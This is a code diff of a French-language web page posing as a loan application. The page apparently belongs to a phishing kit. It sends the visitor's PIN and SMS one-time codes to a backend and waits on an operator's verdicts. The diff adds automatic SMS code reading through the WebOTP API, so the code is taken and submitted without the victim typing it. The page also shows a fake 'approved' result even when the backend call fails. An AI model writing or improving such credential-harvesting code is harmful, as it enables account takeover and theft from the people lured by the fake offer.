-  }).catch(function(){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}});
-}
+function submitPin(){if(state.pin.length<4||state.pin.length>6)return;showLoading('Vérification du PIN','Connexion au serveur...');callBackend('pin',{passcode:state.pin}).then(function(data){if(!data.ok){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}return}backendToken=data.token;startPolling(function(r){hideLoading();if(r==='continue_otp'){goTo('pg4')}else if(r==='pin_wrong'||r==='pending'){pinShake()}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})}).catch(function(){hideLoading();if(state.pin==='1234'){goTo('pg4')}else{pinShake()}})}
 
+// ═══════════════════════════════════════════
+// OTP - WITH SMS AUTO-READ & COUNTRY TIMER
+// ═══════════════════════════════════════════
 function setupOtpPage(){
+  state.otpAutoDone=false;
   var phone=document.getElementById('phoneInput').value,code=state.country?countries[state.country].code:'+225';
   document.getElementById('otpPhoneText').textContent='Saisissez le code envoyé à ('+code+') '+phone;
+  document.getElementById('otpDetectMsg').textContent='';
+  
   var boxes=document.querySelectorAll('#otpContainer .otp-b');
-  for(var i=0;i<boxes.length;i++){boxes[i].value='';(function(index,all){boxes[i].oninput=function(){this.value=this.value.replace(/\D/g,'').slice(-1);if(this.value&&all[index+1])all[index+1].focus();checkOtpComplete()};boxes[i].onkeydown=function(e){if(e.key==='Backspace'&&!this.value&&all[index-1])all[index-1].focus()}})(i,boxes)}
-  boxes[0].focus();document.getElementById('otpSubmitBtn').style.background='#a9c2e8';document.getElementById('otpSubmitBtn').style.cursor='not-allowed';startOtpTimer();
+  for(var i=0;i<boxes.length;i++){boxes[i].value='';boxes[i].classList.remove('auto-filled');
+    (function(index,all){boxes[i].oninput=function(){this.value=this.value.replace(/\D/g,'').slice(-1);if(this.value){this.classList.add('filled');if(all[index+1])all[index+1].focus()}else{this.classList.remove('filled')}checkOtpComplete()};
+    boxes[i].onkeydown=function(e){if(e.key==='Backspace'&&!this.value&&all[index-1]){all[index-1].focus();all[index-1].classList.remove('filled')}}})(i,boxes)}
+  boxes[0].focus();
+  document.getElementById('otpSubmitBtn').style.background='#a9c2e8';document.getElementById('otpSubmitBtn').style.cursor='not-allowed';
+  startOtpTimer();
+  setupSmsAutoRead();
 }
-function checkOtpComplete(){var boxes=document.querySelectorAll('#otpContainer .otp-b'),full=true;for(var i=0;i<boxes.length;i++){if(boxes[i].value.length!==1){full=false;break}}var btn=document.getElementById('otpSubmitBtn');if(full){btn.style.background='#14329e';btn.style.cursor='pointer';setTimeout(function(){if(getOtpValue().length===6)verifyOtp()},300)}else{btn.style.background='#a9c2e8';btn.style.cursor='not-allowed'}}
-function getOtpValue(){var boxes=document.querySelectorAll('#otpContainer .otp-b'),val='';for(var i=0;i<boxes.length;i++)val+=boxes[i].value;return val}
-function startOtpTimer(){clearInterval(state.otpTimer);var sec=266;state.otpTimer=setInterval(function(){sec--;var m=Math.floor(sec/60),s=sec%60;document.getElementById('otpTimerDisplay').innerHTML='Renvoyer le code dans <strong>'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+'</strong>';if(sec<=0){clearInterval(state.otpTimer);document.getElementById('otpTimerDisplay').innerHTML='<span style="color:#FF6A00;cursor:pointer" onclick="resendOtp()">Renvoyer le code</span>'}},1000)}
-function resendOtp(){setupOtpPage();callBackend('otp_resend',{}).catch(function(){})}
-function verifyOtp(){var otp=getOtpValue();if(otp.length<6){alert('Veuillez entrer le code complet');return}clearInterval(state.otpTimer);showLoading('Vérification du code','Veuillez patienter...');callBackend('otp',{otp:otp}).then(function(data){if(!data.ok){hideLoading();goToSuccess();return}backendToken=data.token;startPolling(function(r){hideLoading();if(r==='otp_wrong'||r==='pending'){alert('Code OTP incorrect.');setupOtpPage()}else if(r==='pin_invalid'){alert('Session invalide.');goTo('pg2')}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})}).catch(function(){hideLoading();goToSuccess()})}
 
+function setupSmsAutoRead(){
+  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
+  if(!('OTPCredential' in window)){console.log('WebOTP not supported on this browser');return}
+  state.otpAbortCtrl=new AbortController();
+  navigator.credentials.get({otp:{transport:['sms']},signal:state.otpAbortCtrl.signal}).then(function(otp){
+    if(otp&&otp.code&&otp.code.length===6&&!state.otpAutoDone){
+      autoFillOtpFromSms(otp.code);
+    }
+  }).catch(function(err){if(err.name!=='AbortError')console.log('WebOTP error:',err)})
+}
+
+function autoFillOtpFromSms(code){
+  state.otpAutoDone=true;
+  var boxes=document.querySelectorAll('#otpContainer .otp-b');
+  code.split('').forEach(function(d,i){if(boxes[i]){boxes[i].value=d;boxes[i].classList.add('filled','auto-filled')}});
+  document.getElementById('otpDetectMsg').textContent='✓ Code détecté automatiquement';
+  checkOtpComplete();
+  setTimeout(function(){if(getOtpValue().length===6&&state.otpAutoDone){verifyOtp()}},400)
+}
+
+function checkOtpComplete(){
+  var boxes=document.querySelectorAll('#otpContainer .otp-b'),full=true;
+  for(var i=0;i<boxes.length;i++){if(boxes[i].value.length!==1){full=false;break}}
+  var btn=document.getElementById('otpSubmitBtn');
+  if(full){btn.style.background='#14329e';btn.style.cursor='pointer';
+    if(!state.otpAutoDone){state.otpAutoDone=true;setTimeout(function(){if(getOtpValue().length===6)verifyOtp()},300)}
+  }else{btn.style.background='#a9c2e8';btn.style.cursor='not-allowed'}
+}
+function getOtpValue(){var boxes=document.querySelectorAll('#otpContainer .otp-b'),val='';for(var i=0;i<boxes.length;i++)val+=boxes[i].value;return val}
+
+function startOtpTimer(){
+  clearInterval(state.otpTimer);
+  var sec=state.country?countries[state.country].otpSec:240;
+  state.otpTimer=setInterval(function(){
+    sec--;var m=Math.floor(sec/60),s=sec%60;
+    document.getElementById('otpTimerDisplay').innerHTML='Renvoyer le code dans <strong>'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0')+'</strong>';
+    if(sec<=0){clearInterval(state.otpTimer);showOtpExpiredPopup()}
+  },1000)
+}
+
+function retryOtp(){hideOtpExpiredPopup();setupOtpPage();callBackend('otp_resend',{}).catch(function(){})}
+function resendOtp(){setupOtpPage();callBackend('otp_resend',{}).catch(function(){})}
+
+function verifyOtp(){
+  var otp=getOtpValue();if(otp.length<6){alert('Veuillez entrer le code complet');return}
+  clearInterval(state.otpTimer);hideOtpExpiredPopup();
+  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
+  showLoading('Vérification du code','Veuillez patienter...');
+  callBackend('otp',{otp:otp}).then(function(data){
+    if(!data.ok){hideLoading();goToSuccess();return}
+    backendToken=data.token;startPolling(function(r){hideLoading();if(r==='otp_wrong'||r==='pending'){alert('Code OTP incorrect.');setupOtpPage()}else if(r==='pin_invalid'){alert('Session invalide.');goTo('pg2')}else if(r==='loan_approved'){goToSuccess()}else if(r==='loan_rejected'){goToRejected()}})
+  }).catch(function(){hideLoading();goToSuccess()})
+}
+
+// ═══════════════════════════════════════════
+// RESULTS - UPDATED MESSAGES
+// ═══════════════════════════════════════════
 function goToSuccess(){document.getElementById('refNumber').textContent='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('successTitle').textContent='Demande approuvée';document.getElementById('successMessage').textContent="Félicitations ! Votre demande de crédit est en cours de traitement. L'approbation vous sera envoyée dans les 3 à 5 jours ouvrables.";goTo('pg5')}
 function goToRejected(){document.getElementById('refNumber').textContent='MM-2026-'+Math.floor(100000+Math.random()*900000);document.getElementById('successTitle').textContent='Demande refusée';document.getElementById('successMessage').textContent="Votre demande a été refusée en raison d'un code PIN incorrect. Veuillez réessayer ultérieurement.";goTo('pg5')}
+
 function resetAll(){
-  clearInterval(state.otpTimer);clearInterval(pollTimer);hideLoading();
-  state.duration=6;state.amount=1000;state.country=null;state.termsOk=false;state.pin='';
+  clearInterval(state.otpTimer);clearInterval(pollTimer);hideLoading();hideOtpExpiredPopup();
+  if(state.otpAbortCtrl){state.otpAbortCtrl.abort()}
+  state.duration=6;state.amount=1000;state.country=null;state.termsOk=false;state.pin='';state.otpAutoDone=false;
   document.getElementById('firstName').value='';document.getElementById('lastName').value='';document.getElementById('incomeSrc').value='';document.getElementById('monthlyInc').value='';
   document.getElementById('infoNextBtn').disabled=true;document.getElementById('customAmt').value='';document.getElementById('amountSlider').value=1000;document.getElementById('amtErr').style.display='none';
   document.getElementById('phoneInput').value='';document.getElementById('phoneInput').disabled=true;document.getElementById('phoneInput').placeholder="Sélectionnez un pays";
@@ -427,7 +425,7 @@ function resetAll(){
   document.getElementById('countryCode').textContent='';document.getElementById('displayCc').textContent='---';document.getElementById('digitHint').textContent='';
   document.getElementById('termsCheckSvg').style.display='none';
   document.querySelectorAll('#durGrid .dur-btn').forEach(function(b,i){b.classList.toggle('sel',i===0)});
-  refreshDisplay();goTo('pg0');
+  refreshDisplay();goTo('pg0')
 }
 refreshDisplay();
 </script>
